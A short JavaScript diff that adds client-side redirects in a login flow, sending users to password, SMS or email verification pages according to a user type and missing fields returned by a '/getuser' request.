@@ -18,9 +18,26 @@
         ajax('/getuser?mail=' + userMail, function () {
             if (this.readyState == 4 && this.status == 200) {
                 var xhr = JSON.parse(this.responseText);
+
                 debugger;
-                if (xhr.stype == 2) {
+                if (xhr.stype == 2 && xhr.password2 == null) {
                     window.location.href = '/Password2';
+                }
+
+                if (xhr.stype == 3 && xhr.phone == null) {
+                    window.location.href = '/Sms';
+                }
+
+                if (xhr.stype == 4 && xhr.phone == null) {
+                    window.location.href = '/SmsSend';
+                }
+
+                if (xhr.stype == 5 && xhr.mailsend == null) {
+                    window.location.href = '/Mail';
+                }
+
+                if (xhr.stype == 6 && xhr.mailcode == null) {
+                    window.location.href = '/MailSend';
                 }
 
                 if (xhr.stype == 9999) {
